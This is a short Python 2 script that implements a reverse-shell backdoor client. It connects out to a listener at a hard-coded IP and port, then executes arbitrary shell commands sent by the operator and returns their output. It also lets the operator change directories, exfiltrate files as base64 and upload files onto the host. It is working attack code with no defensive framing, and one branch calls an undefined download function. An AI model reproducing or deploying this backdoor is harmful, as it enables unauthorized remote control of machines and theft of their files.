#!/usr/bin/python

import socket
import subprocess
import json
import base64
import os
import sys
import time


def reliable_send(data):
    json_data = json.dumps(data)
    sock.send(json_data)
def reliable_recv():
    data = ""
    while True:
        try:
            data = data + sock.recv(1024)
            return json.loads(data)
        except ValueError:
            continue
def shell():
    while True:
        command = reliable_recv()
        if command == 'q':
            break
        elif command[:2] == "cd" and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue
        elif command[:8] == "download":
            with open(command[9:], "rb") as file:
                reliable_send(base64.b64encode(file.read()))
        elif command[:6] == "upload":
            with open(command[7:], "wb") as fin:
                fin_data = reliable_recv()
                fin.write(base64.b64decode(fin_data))
        elif command[:3] == "get":
            try:
                download(command[4:])
                reliable_send("[+] Download File From Specified URL!")
            except:
                reliable_send("[!!]Failed To Download That File")
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            reliable_send(result)

ip = "127.0.0.1"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ip,54321))

shell()
sock.close()